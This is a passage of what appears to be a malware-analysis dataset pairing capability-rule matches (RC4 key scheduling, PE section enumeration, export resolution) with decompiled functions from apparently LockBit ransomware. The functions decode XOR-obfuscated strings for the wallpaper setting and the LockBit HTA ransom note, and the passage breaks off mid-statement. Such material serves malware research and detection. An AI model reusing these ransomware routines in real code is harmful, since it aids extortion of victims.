        "decompiled_code": "\nuint * __fastcall fcn.00401540(uint *param_1)\n\n{\n    *param_1 = 0x46002f;\n    param_1[1] = 0x4e0042;\n    param_1[2] = 0x4a0048;\n    param_1[3] = 0x4d0000;\n    param_1[4] = 0x5f0042;\n    *(param_1 + 5) = 0x2f;\n    *(param_1 + 0x16) = str._s.bmp._0_4_ ^ 0x2f;\n    *(param_1 + 6) = str._s.bmp._0_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x1a) = str._s.bmp._4_4_ ^ 0x2f;\n    *(param_1 + 7) = str._s.bmp._4_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x1e) = str._s.bmp._8_4_ ^ 0x2f;\n    *(param_1 + 8) = str._s.bmp._8_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x22) = *0x41da7c ^ 0x2f;\n    *(param_1 + 9) = *0x41da7c >> 0x10 ^ 0x2f;\n    *(param_1 + 0x26) = str.WallpaperStyle._0_4_ ^ 0x2f;\n    *(param_1 + 10) = 0;\n    return param_1;\n}\n",
        "token_count": 394
    },
    "004015f0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004015f0(uint *param_1)\n\n{\n    *param_1 = 0x39001c;\n    param_1[1] = 0x32006f;\n    param_1[2] = 0x71007e;\n    param_1[3] = 0x1c006c;\n    *(param_1 + 4) = *0x41da7e ^ 0x1c;\n    *(param_1 + 0x12) = str.WallpaperStyle._0_4_ ^ 0x1c;\n    *(param_1 + 5) = str.WallpaperStyle._0_4_ >> 0x10 ^ 0x1c;\n    *(param_1 + 0x16) = str.WallpaperStyle._4_4_ ^ 0x1c;\n    *(param_1 + 6) = str.WallpaperStyle._4_4_ >> 0x10 ^ 0x1c;\n    *(param_1 + 0x1a) = str.WallpaperStyle._8_4_ ^ 0x1c;\n    *(param_1 + 7) = 0;\n    return param_1;\n}\n",
        "token_count": 274
    },
    "00401670": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00401670(uint *param_1)\n\n{\n    *param_1 = 0x3d0046;\n    param_1[1] = 0x50074;\n    param_1[2] = 0x73;\n    param_1[3] = 0x7f;\n    param_1[4] = 0x50005;\n    param_1[5] = 0x6b;\n    param_1[6] = 0x700074;\n    param_1[7] = 0x6b0070;\n    param_1[8] = 0x750072;\n    param_1[9] = 0x700000;\n    param_1[10] = 0x4006b;\n    param_1[0xb] = 0x20000;\n    param_1[0xc] = 0x6b0071;\n    param_1[0xd] = 0x75007e;\n    param_1[0xe] = 0x2007e;\n    param_1[0xf] = 0x30007;\n    param_1[0x10] = 0x700074;\n    param_1[0x11] = 0x3007f;\n    param_1[0x12] = 0x770077;\n    param_1[0x13] = 0x46003b;\n    *(param_1 + 0x14) = *0x41db36 ^ 0x46;\n    *(param_1 + 0x52) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._0_4_ ^ 0x46;\n    *(param_1 + 0x15) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._0_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x56) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._4_4_ ^ 0x46;\n    *(param_1 + 0x16) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._4_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x5a) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._8_4_ ^ 0x46;\n    *(param_1 + 0x17) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._8_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x5e) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._12_4_ ^ 0x46;\n    *(param_1 + 0x18) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._12_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x62) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._16_4_ ^ 0x46;\n    *(param_1 + 0x19) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._16_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x66) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._20_4_ ^ 0x46;\n    *(param_1 + 0x1a) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._20_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x6a) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._24_4_ ^ 0x46;\n    *(param_1 + 0x1b) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._24_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x6e) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._28_4_ ^ 0x46;\n    *(param_1 + 0x1c) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._28_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x72) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._32_4_ ^ 0x46;\n    *(param_1 + 0x1d) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._32_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x76) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._36_4_ ^ 0x46;\n    *(param_1 + 0x1e) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._36_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x7a) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._40_4_ ^ 0x46;\n    *(param_1 + 0x1f) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._40_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x7e) =\n         